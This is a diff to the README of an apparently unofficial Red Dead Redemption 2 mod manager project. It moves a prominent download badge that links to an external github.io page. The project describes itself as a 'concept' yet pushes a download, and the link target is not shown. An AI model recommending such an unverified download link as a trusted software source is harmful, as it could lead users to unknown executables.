@@ -1,14 +1,18 @@
 # RDR2 Mod Manager — Red Dead Redemption 2 Mod Manager for PC
 
-| 🚀 Download RDR2 Mod Manager |
-|---|
-| [![Download RDR2 Mod Manager](https://img.shields.io/badge/Download-Latest_Version-blue?style=for-the-badge&logo=github)](https://RDR2-Mod-Manager.github.io/.github/) |
-
 **RDR2 Mod Manager** is an open-source mod manager concept for **Red Dead Redemption 2 on PC**. It is designed to help players install, enable, disable, organize, backup, and troubleshoot single-player RDR2 mods without losing track of game files.
 
 > Unofficial project. Not affiliated with, endorsed by, or sponsored by Rockstar Games, Take-Two Interactive, Nexus Mods, Lenny's Mod Loader, Script Hook RDR2, or any mod author. Use mods responsibly and always keep backups.
 
 ![RDR2 Mod Manager banner](assets/banner.png)
+
+<div align="center">
+
+| 🚀 Download RDR2 Mod Manager |
+|---|
+| [![Download RDR2 Mod Manager](https://img.shields.io/badge/Download-Latest_Version-blue?style=for-the-badge&logo=github)](https://RDR2-Mod-Manager.github.io/.github/) |
+
+</div>
 
 ## Why this RDR2 Mod Manager exists
 
